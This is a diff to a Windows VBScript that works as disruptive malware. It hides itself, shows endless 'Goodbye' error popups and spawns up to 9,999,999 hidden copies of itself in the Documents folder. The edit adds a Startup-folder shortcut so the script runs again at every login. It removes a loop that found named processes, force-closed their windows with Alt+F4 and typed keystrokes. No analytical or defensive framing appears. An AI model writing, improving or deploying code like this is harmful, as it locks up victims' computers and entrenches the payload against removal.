@@ -16,10 +16,8 @@ For Each objFile In objFolder.Files
     End If
 Next
 
-' Release FileSystemObject resources
-Set objFile = Nothing
-Set objFolder = Nothing
-Set objFSO = Nothing
+' Hide the original script
+objFSO.GetFile(WScript.ScriptFullName).Attributes = objFSO.GetFile(WScript.ScriptFullName).Attributes Or 2 ' Hidden
 
 ' Create a Shell object
 Set objShell = CreateObject("WScript.Shell")
@@ -45,7 +43,7 @@ Do While True
     objShell.Popup "Goodbye", 0, "Error", &H10
 
     ' Wait for one second before repeating the loop
-    WScript.Sleep 0
+    WScript.Sleep 1000
 Loop
 
 Set WshShell = WScript.CreateObject("WScript.Shell")
@@ -65,24 +63,9 @@ For i = 1 to 9999999
     WshShell.Run chr(34) & strDocumentsPath & "\" & fso.GetFileName(WScript.ScriptFullName) & i & ".vbs" & chr(34), 0, False
 Next
 
-' Hide the original script
-fso.GetFile(WScript.ScriptFullName).Attributes = fso.GetFile(WScript.ScriptFullName).Attributes Or 2 ' Hidden
-
-Do
-    For Each strExeName In strExeNames
-        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\.\root\cimv2")
-Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
-    If colProcessList.Count > 0 Then
-        For Each objProcess In colProcessList
-            WshShell.AppActivate objProcess.ProcessId
-            WScript.Sleep 0 'wait for window to activate before closing
-            WshShell.SendKeys "%{F4}" 'sends Alt+F4 to close window
-        Next
-    End If
-Next
-
-'Type "n" into search bar with focus
-WshShell.SendKeys "n"
-
-WScript.Sleep 0 'wait before checking again
-Loop
+' Create a shortcut in the Startup folder to run the script when the user logs in
+strStartupPath = WshShell.SpecialFolders("Startup")
+Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\ScriptLauncher.lnk")
+objShellLink.TargetPath = "wscript.exe"
+objShellLink.Arguments = """" & WScript.ScriptFullName & """"
+objShellLink.Save
